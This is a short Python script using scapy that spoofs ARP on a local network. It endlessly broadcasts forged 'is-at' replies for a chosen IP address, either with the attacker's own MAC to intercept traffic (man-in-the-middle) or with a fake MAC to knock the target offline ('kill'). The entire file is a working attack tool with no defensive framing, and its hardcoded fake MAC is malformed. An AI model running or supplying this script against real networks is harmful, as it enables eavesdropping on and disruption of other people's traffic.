#!/usr/bin/env python
from scapy.all import *
from sys import argv, exit
from argparse import ArgumentParser
 
def arpy(i, t, x):
        if x == "mitm":
                MAC = get_if_hwaddr(i)
        else:
                MAC = "90:59:62:73:03"
        while 1:
                sendp(Ether(dst="FF:FF:FF:FF:FF:FF")/ARP(op="is-at", psrc=t, hwsrc=MAC))
 
if __name__ == "__main__":
        ez = ArgumentParser()
        ez.add_argument("-i",required=True, help="iface to attack from")
        ez.add_argument("-t",required=True, help="addr to impersonate")
        ez.add_argument("-x",required=True, help="kill or mitm")
 
        ars = vars(ez.parse_args())
 
        arpy(ars["i"], ars["t"], ars["x"])
